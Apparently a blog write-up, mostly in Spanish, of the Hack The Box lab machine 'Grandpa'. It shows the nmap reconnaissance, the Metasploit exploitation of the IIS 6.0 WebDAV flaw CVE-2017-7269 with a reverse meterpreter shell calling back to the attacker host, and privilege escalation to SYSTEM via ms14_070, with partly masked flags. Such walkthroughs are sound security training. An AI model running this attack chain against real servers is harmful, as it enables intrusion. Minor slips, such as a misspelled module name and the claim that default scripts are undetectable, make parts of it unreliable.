---
title: Grandpa
date: 2025-11-22 11:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, grandpa ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/381683fd107da11f1dc916401ae8aee0.png
    alt: Hack The Box
---

> Grandpa
Windows · Easy 



## Task1

Which version of Microsoft IIS is running on TCP port 80?

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- 10.129.95.233 -sV -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 13:01 EST
Nmap scan report for 10.129.95.233
Host is up (0.042s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sat, 22 Nov 2025 18:04:46 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.36 seconds
```
Todo empieza en Nmap pero en este caso debemos valernOs de los flags -sV para descubrir la versión del servicio -sC 
que activa los scripts por defecto de NSE (Nmap Scripting Engine).Nmap ejecutará un conjunto de scripts seguros
(en teoría no detectables) y útiles para reconocimiento general. 

> 6.0

## Task2

Which 2017 CVE abuses a Buffer overflow in the ScStoragePathFromUrl function in that specific IIS version, allowing remote attackers to execute arbitrary code?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ searchsploit Microsoft IIS 6.0 -w
---------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                |  URL
---------------------------------------------------------------------------------------------- --------------------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure              | https://www.exploit-db.com/exploits/21057
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                       | https://www.exploit-db.com/exploits/9541
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                         | https://www.exploit-db.com/exploits/9587
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                  | https://www.exploit-db.com/exploits/3965
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)        | https://www.exploit-db.com/exploits/15167
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                      | https://www.exploit-db.com/exploits/41738
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                       | https://www.exploit-db.com/exploits/8765
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                   | https://www.exploit-db.com/exploits/8704
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                   | https://www.exploit-db.com/exploits/8806
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                               | https://www.exploit-db.com/exploits/8754
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                      | https://www.exploit-db.com/exploits/19033
---------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```

Si usamos searchsploit con el flag -w nos muestra las URL del exploit en **exploit-db.com**
[https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)
Y dentro de esta tendremos acceso al enlace de **nvd.nist.gov** sobre el CVE
[https://nvd.nist.gov/vuln/detail/CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269)

> CVE-2017-7269

## Task3

Which metasploit module can be used to exploit the aforementioned CVE?

``` shell
msf > search ScStoragePathFromUrl

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

Metasploit no decepciona, buscamos **ScStoragePathFromUrl** y nos da la respuesta 

> iis_webdav_scstoragepathfromurls

## Task4

Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

``` shell
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.129.95.233
rhosts => 10.129.95.233
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0
lhost => 10.10.14.236
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
[*] Started reverse TCP handler on 10.10.14.236:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (188998 bytes) to 10.129.95.233
[*] Meterpreter session 1 opened (10.10.14.236:4444 -> 10.129.95.233:1030) at 2025-11-22 13:35:36 -0500

meterpreter > dir
Listing: c:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-04-12 10:12:15 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-04-12 10:03:34 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-04-12 10:04:48 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-04-12 10:32:01 -0400  Harry
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService

meterpreter > cd Harry\\
[-] stdapi_fs_chdir: Operation failed: Access is denied
```

Esta vulnerabilidad nos permite establecer una sesión de meterpreter pero no tenemos acceso a la carpeta de Harry. 

``` shell
meterpreter > migrate 3344
[*] Migrating from 1996 to 3344...
[*] Migration completed successfully.

meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.
```

Sobre **local_exploit_suggester** decir que es una herramienta nos permite buscar vulnerabilidades en aquellos objetivos donde ya tengamos abierta una sesión
de meterpreter, es como un tunel que nos permitirá enviar payloads a dicha sesión,  interactuar y llevar la explotación más alla.
Enviamos la **session** de meterpreter coseguida al background y hacemos uso de una herramienta de post-explotación **local_exploit_suggester**
En metasploit el prompt cambia **msf post(multi/recon/local_exploit_suggester) >** indicando que ahora estamos usando una herramienta de esta 
clasificación. De paso vamos a hacer **migrate** al proceso, esto le da estabilidad al proceso de meterpreter, lo recomendado es utilizar algún comando que ya este en el 
sistema.

> local_exploit_suggester


Submit the flag located on the Harry user's desktop.

``` shell
msf post(multi/recon/local_exploit_suggester) > set session 1 
session => 1
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.95.233 - Collecting local exploits for x86/windows...
[*] 10.129.95.233 - 225 exploit checks are being tried...
[+] 10.129.95.233 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.95.233 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.95.233 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.95.233 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.95.233 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.95.233 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.129.95.233 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.                                                                                                                                      
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.                                                                                                                                      
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
``` 

Ahora sabemos que hay varios posibles exploits que podriamos usar para escalar privilegios recordando que es un módulo para buscar exploits locales

Submit the flag located on the administrator's desktop.

``` shell
msf exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.15     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2
```

Al buscar las opciones ya vemos que nos pide un número de sesión, el meterpreter que ya habíamos establecido, esa sesión es la que 
hará la función de tunel para lanzar el exploit

``` shell
msf exploit(windows/local/ms14_070_tcpip_ioctl) > run
[*] Started reverse TCP handler on 10.10.14.236:4448 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (188998 bytes) to 10.129.95.233
[*] Meterpreter session 2 opened (10.10.14.236:4448 -> 10.129.95.233:1031) at 2025-11-22 15:18:50 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Ahora ya somos **SYSTEM**

```shell
meterpreter > cd Documents\ and\ Settings\\
dir
meterpreter > dir
Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-04-12 10:12:15 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-04-12 10:03:34 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-04-12 10:04:48 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-04-12 10:32:01 -0400  Harry
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService

meterpreter > cat user.txt 
bdff5ec67c3cff017************
```

> bdff5ec67c3cff017************

Submit the flag located on the administrator's desktop.

``` shell
meterpreter > cat root.txt 
9359e905a2c35f861************
```

> 9359e905a2c35f861f6************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/13)